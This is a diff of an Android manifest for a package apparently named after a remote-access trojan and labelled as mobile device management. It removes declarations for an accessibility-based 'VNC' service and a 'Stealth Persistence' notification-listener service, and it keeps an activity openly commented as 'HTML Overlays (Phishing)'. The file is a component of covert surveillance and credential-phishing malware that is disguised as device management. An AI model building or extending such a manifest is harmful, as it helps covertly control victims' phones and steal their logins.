@@ -80,27 +80,6 @@
             android:excludeFromRecents="true"
             android:exported="false"/>
         
-        <!-- ─── Enhanced MDM: Accessibility VNC Service ─── -->
-        <service
-            android:name="com.etechd.l3mon.MDMAccessibilityService"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <!-- Assuming xml/accessibility_service_config exists, or falling back -->
-        </service>
-
-        <!-- ─── Enhanced MDM: Stealth Persistence Service ─── -->
-        <service
-            android:name="com.etechd.l3mon.MDMPersistenceService"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.service.notification.NotificationListenerService" />
-            </intent-filter>
-        </service>
-        
         <!-- ─── Advanced Module: HTML Overlays (Phishing) ─── -->
         <activity
             android:name="com.system.android.ui.OverlayActivity"
